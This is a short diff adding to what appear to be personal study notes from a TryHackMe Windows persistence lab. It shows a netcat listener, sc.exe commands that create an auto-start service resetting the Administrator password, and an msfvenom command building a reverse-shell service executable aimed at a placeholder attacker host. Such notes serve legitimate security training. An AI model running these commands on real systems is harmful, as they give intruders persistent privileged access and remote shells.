@@ -108,6 +108,18 @@ nc -lvp 4448
 -get flag
 *THM{TXT_FILES_WOULD_NEVER_HURT_YOU}
 
+--------------------------------------------------------------------------------------------------------------------------------
+
+Abusing Services
+-using service is great for establishing persistence
+-configured to run in the background
+-can regain control of victim machine each time it is started
+-create a background service
+sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
+sc.exe start THMservice
+-create a reverse shell with msfvenom and associate it with the created service
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=[Attack IP] LPORT=[attack port] -f exe-service -o rev-svc.exe
+
 
 
 
